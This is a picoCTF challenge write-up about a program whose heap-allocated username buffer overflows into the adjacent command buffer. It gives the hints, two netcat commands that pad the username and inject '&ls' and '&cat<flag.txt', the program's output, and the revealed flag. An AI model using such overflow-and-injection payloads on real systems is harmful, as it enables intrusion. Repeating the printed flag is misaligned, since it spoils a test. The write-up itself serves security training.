This program greets you and then runs a command. But can you take control of what command it executes?

Additional details will be available after launching your challenge instance.

Hints
- Notice how `username` and `shell` are both heap-allocated.
- Offsets often hide in the memory addresses you see at runtime.
- Try to overwrite what command gets executed.

Connect to the program with netcat: `nc saffron-estate.picoctf.net 56287`.You can Download the program file [here](https://challenge-files.picoctf.net/c_saffron_estate/ae2d22b69a50bbe5ba1bfba8785fd57faede0fc0837e40f149e8961e803f0bf5/vuln). And source [code](https://challenge-files.picoctf.net/c_saffron_estate/ae2d22b69a50bbe5ba1bfba8785fd57faede0fc0837e40f149e8961e803f0bf5/vuln.c)
## Solve

```
nc saffron-estate.picoctf.net 56287 <<< "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&ls"
username at 0x21eae2a0
shell at 0x21eae2d0
Enter username: flag.txt
Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&ls. Your shell is ls.


nc saffron-estate.picoctf.net 56287 <<< "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&cat<flag.txt"
username at 0x3d7712a0
shell at 0x3d7712d0
Enter username: picoCTF{us3rn4m3_2_sh3ll_e7257819}Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&cat<flag.txt. Your shell is cat<flag.txt
```

